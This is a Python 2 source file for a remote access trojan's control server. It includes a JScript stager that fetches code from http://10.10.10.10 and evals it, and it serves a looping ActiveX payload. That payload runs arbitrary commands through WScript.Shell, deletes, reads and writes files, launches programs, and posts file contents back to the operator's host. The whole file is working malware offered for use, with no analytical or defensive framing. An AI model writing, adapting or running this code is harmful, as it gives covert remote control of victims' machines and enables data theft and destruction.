import os
from threading import Thread
from BaseHTTPServer import HTTPServer, BaseHTTPRequestHandler

#<script language="javascript" type="text/javascript">
#h=new ActiveXObject("WinHttp.WinHttpRequest.5.1");
#h.Open("GET","http://10.10.10.10/connect",false);
#h.Send();
#B=h.ResponseText;
#eval(B);
#</script>

class ClientThread(Thread):
    def __init__(self):
        Thread.__init__(self)
        self.start()
    def run(self):
        pass

class HTTPHandle(BaseHTTPRequestHandler):

    clinelist = []
    def log_message(self,format, *args):
        pass
    def do_GET(self):
        if self.path.find("connect") != -1:
            print """Usage:
                        cmd:          	just input the cmd command
                        delete file:  	input:delete,then set the file path
                        read file:    	input:read,then set the file path
                        run exe:      	input:run,then set the file path
                        download file:   	input:down,then set the file path
                        upload file:     	input:upload,then set the file path
                        Host Connected"""
            try:
                self.clinelist.remove(str(self.client_address[0]))
            except:
                pass
            self.clinelist.append(str(self.client_address[0]))

            message="""
while (true) {
    h = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
    h.SetTimeouts(0, 0, 0, 0);
    try {
        h.Open("GET", "http://10.10.10.10:8080/rat", false);
        h.Send();
        c = h.ResponseText;
        if (c == "delete") {
            p = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
            p.SetTimeouts(0, 0, 0, 0);
            p.Open("POST", "http://10.10.10.10:8080/rat", false);
            p.Send("[Next Input should be the File to Delete]");

            g = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
            g.SetTimeouts(0, 0, 0, 0);
            g.Open("GET", "http://10.10.10.10:8080/rat", false);
            g.Send();
            d = g.ResponseText;

            fso1 = new ActiveXObject("Scripting.FileSystemObject");

            f = fso1.GetFile(d);
            f.Delete();

            p = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
            p.SetTimeouts(0, 0, 0, 0);
            p.Open("POST", "http://10.10.10.10:8080/rat", false);
            p.Send("[Delete Success]");
            continue;
        }
        else if (c == "download") {
            p = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
            p.SetTimeouts(0, 0, 0, 0);
            p.Open("POST", "http://10.10.10.10:8080/rat", false);
            p.Send("[Next Input should be the File to download]");

            g = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
            g.SetTimeouts(0, 0, 0, 0);
            g.Open("GET", "http://10.10.10.10:8080/rat", false);
            g.Send();
            d = g.ResponseText;

            fso1 = new ActiveXObject("Scripting.FileSystemObject");
            f = fso1.OpenTextFile(d, 1);
            g = f.ReadAll();
            f.Close();
            p = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
            p.SetTimeouts(0, 0, 0, 0);
            p.Open("POST", "http://10.10.10.10:8080/download", false);
            p.Send(g);
            continue;
        }
        else if (c == "read") {
            p = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
            p.SetTimeouts(0, 0, 0, 0);
            p.Open("POST", "http://10.10.10.10:8080/rat", false);
            p.Send("[Next Input should be the File to Read]");

            g = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
            g.SetTimeouts(0, 0, 0, 0);
            g.Open("GET", "http://10.10.10.10:8080/rat", false);
            g.Send();
            d = g.ResponseText;

            fso1 = new ActiveXObject("Scripting.FileSystemObject");
            f = fso1.OpenTextFile(d, 1);
            g = f.ReadAll();
            f.Close();

            p = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
            p.SetTimeouts(0, 0, 0, 0);
            p.Open("POST", "http://10.10.10.10:8080/rat", false);
            p.Send(g);
            continue;
        }
        else if (c == "run") {
            p = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
            p.SetTimeouts(0, 0, 0, 0);
            p.Open("POST", "http://10.10.10.10:8080/rat", false);
            p.Send("[Next Input should be the File to Run]");

            g = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
            g.SetTimeouts(0, 0, 0, 0);
            g.Open("GET", "http://10.10.10.10:8080/rat", false);
            g.Send();
            d = g.ResponseText;
            r = new ActiveXObject("WScript.Shell").Run(d, 0, true);
            p = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
            p.SetTimeouts(0, 0, 0, 0);
            p.Open("POST", "http://10.10.10.10:8080/rat", false);
            p.Send("[Run Success]");

            continue;
        }
        else if (c == "upload") {
            p = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
            p.SetTimeouts(0, 0, 0, 0);
            p.Open("POST", "http://10.10.10.10:8080/rat", false);
            p.Send("[Start to Upload]");

            g = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
            g.SetTimeouts(0, 0, 0, 0);
            g.Open("GET", "http://10.10.10.10:8080/uploadpath", false);
            g.Send();
            dpath = g.ResponseText;

            g2 = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
            g2.SetTimeouts(0, 0, 0, 0);
            g2.Open("GET", "http://10.10.10.10:8080/uploaddata", false);
            g2.Send();
            ddata = g2.ResponseText;
            fso1 = new ActiveXObject("Scripting.FileSystemObject");
            f = fso1.CreateTextFile(dpath, true);
            f.WriteLine(ddata);
            f.Close();

            p = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
            p.SetTimeouts(0, 0, 0, 0);
            p.Open("POST", "http://10.10.10.10:8080/rat", false);
            p.Send("[Upload Success]");
            continue;
        }
        else {
            r = new ActiveXObject("WScript.Shell").Exec(c);
            var so;
            while (!r.StdOut.AtEndOfStream) {
                so = r.StdOut.ReadAll()
            }
            p = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
            p.Open("POST", "http://10.10.10.10:8080/rat", false);
            p.Send(so);
        }

    } catch(e1) {
        p = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
        p.SetTimeouts(0, 0, 0, 0);
        p.Open("POST", "http://10.10.10.10:8080/rat", false);
        p.Send("[No Output]");
    }
}
"""

        if self.path.find("rat") != -1:
            shellcmd="shell:"+str(self.client_address[0])+">>"
            message=raw_input(shellcmd)

        if self.path.find("uploadpath") != -1:
            shellcmd="Uploadpath:"+str(self.client_address[0])+">>"
            message=raw_input(shellcmd)

        if self.path.find("uploaddata") != -1:
            shellcmd="Uploaddata:"+str(self.client_address[0])+">>"
            filepath=raw_input(shellcmd)
            upfile=open(filepath,'r+')
            message=upfile.read()

        self.send_response(200)
        self.send_header("Content-length",len(message))
        self.end_headers()
        message.encode("UTF-8")
        self.wfile.write(message)
        print self.clinelist

    def do_POST(self):
        if self.path.find("rat") != -1:
            print self.rfile.read(int(self.headers['content-length']))

        if self.path.find("download") != -1:
            filename=raw_input("input localfile name:>")
            wfile=open(filename,'w+')
            wfile.write(self.rfile.read(int(self.headers['content-length'])))
            wfile.close()
            print "[Download Success]"

        message="test"
        self.send_response(200)
        self.send_header("Content-length",len(message))
        self.end_headers()
        message.encode("UTF-8")
        self.wfile.write(message)

def start_server(port):  
    http_server = HTTPServer(('10.10.10.10', int(port)), HTTPHandle)
    http_server.serve_forever()

if __name__ == "__main__":
    start_server(8080)
